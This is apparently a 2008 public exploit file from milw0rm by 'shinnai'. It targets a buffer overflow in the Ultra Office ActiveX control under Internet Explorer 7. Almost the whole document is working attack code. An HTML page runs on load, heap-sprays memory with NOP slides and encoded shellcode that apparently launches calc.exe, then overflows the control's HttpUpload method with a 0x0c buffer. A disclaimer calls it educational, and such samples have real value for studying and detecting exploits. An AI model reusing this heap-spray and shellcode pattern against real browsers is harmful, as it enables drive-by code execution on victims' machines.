@@ -1,0 +1,66 @@
+-----------------------------------------------------------------------------
+ Ultra Office ActiveX Control Remote Buffer Overflow
+ url: http://www.ultrashareware.com
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://www.shinnai.net
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Tested on Windows XP Professional SP3 all patched, with Internet Explorer 7
+-----------------------------------------------------------------------------
+<script language="JavaScript" defer>
+  var sCode = unescape("%uE860%u0000%u0000%u815D%u06ED%u0000%u8A00%u1285%u0001%u0800" +
+                       "%u75C0%uFE0F%u1285%u0001%uE800%u001A%u0000%uC009%u1074%u0A6A" +
+                       "%u858D%u0114%u0000%uFF50%u0695%u0001%u6100%uC031%uC489%uC350" +
+                       "%u8D60%u02BD%u0001%u3100%uB0C0%u6430%u008B%u408B%u8B0C%u1C40" +
+                       "%u008B%u408B%uFC08%uC689%u3F83%u7400%uFF0F%u5637%u33E8%u0000" +
+                       "%u0900%u74C0%uAB2B%uECEB%uC783%u8304%u003F%u1774%uF889%u5040" +
+                       "%u95FF%u0102%u0000%uC009%u1274%uC689%uB60F%u0107%uEBC7%u31CD" +
+                       "%u40C0%u4489%u1C24%uC361%uC031%uF6EB%u8B60%u2444%u0324%u3C40" +
+                       "%u408D%u8D18%u6040%u388B%uFF09%u5274%u7C03%u2424%u4F8B%u8B18" +
+                       "%u205F%u5C03%u2424%u49FC%u407C%u348B%u038B%u2474%u3124%u99C0" +
+                       "%u08AC%u74C0%uC107%u07C2%uC201%uF4EB%u543B%u2824%uE175%u578B" +
+                       "%u0324%u2454%u0F24%u04B7%uC14A%u02E0%u578B%u031C%u2454%u8B24" +
+                       "%u1004%u4403%u2424%u4489%u1C24%uC261%u0008%uC031%uF4EB%uFFC9" +
+                       "%u10DF%u9231%uE8BF%u0000%u0000%u0000%u0000%u9000%u6163%u636C" +
+                       "%u652E%u6578%u9000");
+  var sSlide = unescape("%u9090%u9090");
+  var heapSA = 0x0c0c0c0c;
+  function tryMe()
+   {
+    var buffSize = 20000;
+    var x =  unescape("%0c%0c%0c%0c");
+    while (x.length<buffSize) x += x;
+    x = x.substring(0,buffSize);
+    boom.HttpUpload(x, x, x);
+  }
+  function getsSlide(sSlide, sSlideSize)
+   {
+    while (sSlide.length*2<sSlideSize)
+     {
+      sSlide += sSlide;
+     }
+    sSlide = sSlide.substring(0,sSlideSize/2);
+    return (sSlide);
+  }
+  var heapBS = 0x400000;
+  var sizeHDM = 0x5;
+  var PLSize = (sCode.length * 2);
+  var sSlideSize = heapBS - (PLSize + sizeHDM);
+  var heapBlocks = (heapSA+heapBS)/heapBS;
+  var memory = new Array();
+  sSlide = getsSlide(sSlide,sSlideSize);
+  for (i=0;i<heapBlocks;i++)
+   {
+    memory[i] = sSlide +  sCode;
+   }
+ </script>
+ <body onload="JavaScript: return tryMe();">
+  <object id="boom" classid="clsid:00989888-BB72-4E31-A7C6-5F819C24D2F7">
+   Unable to create object
+ </object>
+
+# milw0rm.com [2008-08-27]
